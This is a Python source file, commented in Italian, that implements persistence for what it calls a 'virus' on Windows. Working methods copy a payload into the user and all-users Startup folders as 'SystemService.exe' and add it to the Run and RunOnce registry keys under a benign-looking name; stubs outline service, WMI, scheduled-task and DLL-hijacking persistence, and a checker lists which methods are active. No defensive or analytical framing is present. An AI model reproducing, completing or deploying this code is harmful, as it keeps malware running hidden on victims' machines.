import os
import sys
import winreg
import ctypes
from typing import Optional, List
from pathlib import Path

class Persistence:
    """Classe per implementare meccanismi di persistenza del virus"""
    
    def __init__(self):
        self.startup_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]
        self.reg_run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce")
        ]
        
    def install_startup(self, payload_path: str) -> bool:
        """Installa il payload nella cartella Startup"""
        try:
            for startup_path in self.startup_paths:
                if os.path.exists(startup_path):
                    target_path = os.path.join(startup_path, "SystemService.exe")
                    if not os.path.exists(target_path):
                        with open(payload_path, 'rb') as src, open(target_path, 'wb') as dst:
                            dst.write(src.read())
                        return True
            return False
            
        except Exception as e:
            print(f"Errore nell'installazione startup: {e}")
            return False
            
    def install_registry(self, payload_path: str) -> bool:
        """Aggiunge il payload alle chiavi di registro Run"""
        try:
            for hkey, key_path in self.reg_run_keys:
                try:
                    key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(
                        key,
                        "SystemService",
                        0,
                        winreg.REG_SZ,
                        payload_path
                    )
                    winreg.CloseKey(key)
                    return True
                except:
                    continue
            return False
            
        except Exception as e:
            print(f"Errore nell'installazione registro: {e}")
            return False
            
    def install_service(self, payload_path: str) -> bool:
        """Installa il payload come servizio Windows"""
        try:
            # TODO: Implementare installazione servizio
            # Richiede privilegi elevati
            pass
            
        except Exception as e:
            print(f"Errore nell'installazione servizio: {e}")
            return False
            
    def install_wmi(self, payload_path: str) -> bool:
        """Crea persistenza tramite WMI Event Subscription"""
        try:
            # TODO: Implementare persistenza WMI
            # Richiede accesso WMI
            pass
            
        except Exception as e:
            print(f"Errore nell'installazione WMI: {e}")
            return False
            
    def create_scheduled_task(self, payload_path: str) -> bool:
        """Crea un task schedulato per il payload"""
        try:
            # TODO: Implementare task schedulato
            # Usare schtasks.exe o Win32_ScheduledTask
            pass
            
        except Exception as e:
            print(f"Errore nella creazione task: {e}")
            return False
            
    def install_dll_hijacking(self, target_dll: str, payload_dll: str) -> bool:
        """Implementa DLL hijacking per la persistenza"""
        try:
            # TODO: Implementare DLL hijacking
            # 1. Trova DLL target vulnerabile
            # 2. Backup DLL originale
            # 3. Sostituisci con payload
            pass
            
        except Exception as e:
            print(f"Errore nel DLL hijacking: {e}")
            return False
            
    def check_persistence(self) -> List[str]:
        """Verifica i metodi di persistenza attivi"""
        active_methods = []
        
        # Controlla file di startup
        for path in self.startup_paths:
            target = os.path.join(path, "SystemService.exe")
            if os.path.exists(target):
                active_methods.append(f"Startup: {target}")
                
        # Controlla chiavi di registro
        for hkey, key_path in self.reg_run_keys:
            try:
                key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_READ)
                try:
                    value, _ = winreg.QueryValueEx(key, "SystemService")
                    active_methods.append(f"Registry: {key_path}")
                except:
                    pass
                winreg.CloseKey(key)
            except:
                continue
                
        return active_methods
